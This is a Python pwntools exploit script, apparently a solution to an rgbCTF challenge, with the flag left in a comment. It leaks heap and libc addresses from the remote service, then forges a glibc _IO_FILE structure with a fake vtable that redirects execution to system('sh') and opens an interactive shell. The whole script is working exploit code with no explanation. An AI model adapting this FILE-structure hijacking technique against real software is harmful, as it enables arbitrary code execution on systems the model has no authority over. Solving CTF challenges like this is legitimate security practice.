#flag=rgbCTF{l3ts_g31_th1s_bre@d}
from pwn import *
target=remote('challenge.rgbsec.xyz',6969)
libc=ELF('./itvi.so')
def initt(party_size,name="A"):
	print(target.recvuntil("> "))
	target.sendline(str(party_size))
	if(party_size==0):
		print(target.recvuntil("> "))
		target.sendline(name)
def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))
def choose(size,data):
	init(1)
	print(target.recvuntil("> "))
	target.sendline(str(size))
	print(target.recvuntil("> "))
	target.sendline(data)
def drink(index,item):
	init(2)
	print(target.recvuntil("> "))
	target.sendline(str(index))
	print(target.recvuntil("> "))
	target.sendline(str(item))
def sing():
	init(3)
	print(target.recvuntil("sang "))
	leak=target.recvuntil(" ").strip("\n")
	return leak
def pack_file(_flags = 0,
	      _IO_read_ptr = 0,
	      _IO_read_end = 0,
	      _IO_read_base = 0,
	      _IO_write_base = 0,
	      _IO_write_ptr = 0,
	      _IO_write_end = 0,
	      _IO_buf_base = 0,
	      _IO_buf_end = 0,
	      _IO_save_base = 0,
	      _IO_backup_base = 0,
	      _IO_save_end = 0,
	      _IO_marker = 0,
	      _IO_chain = 0,
	      _fileno = 0,
	      _lock = 0):
    struct = p32(_flags) + \
	     p32(0) + \
	     p64(_IO_read_ptr) + \
	     p64(_IO_read_end) + \
	     p64(_IO_read_base) + \
	     p64(_IO_write_base) + \
	     p64(_IO_write_ptr) + \
	     p64(_IO_write_end) + \
	     p64(_IO_buf_base) + \
	     p64(_IO_buf_end) + \
	     p64(_IO_save_base) + \
	     p64(_IO_backup_base) + \
	     p64(_IO_save_end) + \
	     p64(_IO_marker) + \
	     p64(_IO_chain) + \
	     p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct
initt(0)
choose(0x10,"sh #")
heap_leak=int(sing()[2:],16)
choose(-0x200,"A")
choose(0x210000,"A")
libc_base=int(sing()[2:],16)+0x211000-0x10
libc_stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
libc_system=libc_base+libc.symbols["system"]
io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
fake_vtable_addr = io_str_overflow_ptr_addr - 7*8
file_struct = pack_file(_IO_buf_base = 0,
		_IO_read_ptr = libc_base+0x3eba84,
		_IO_read_end = libc_base+0x3eba84,
		_IO_read_base = libc_base+0x3eba83,
		_IO_buf_end = (heap_leak-100)/2,
		_IO_write_ptr = (heap_leak-100)/2+5,
		_IO_write_base = 0,
		_lock = libc_base+0x3ed8d0)
file_struct += p64(fake_vtable_addr)
file_struct += p64(libc_system)
file_struct += p64(libc_stdout)
choose(0x20,p64(libc_stdout)*4)
choose(0x100,file_struct)
target.interactive()
	



		
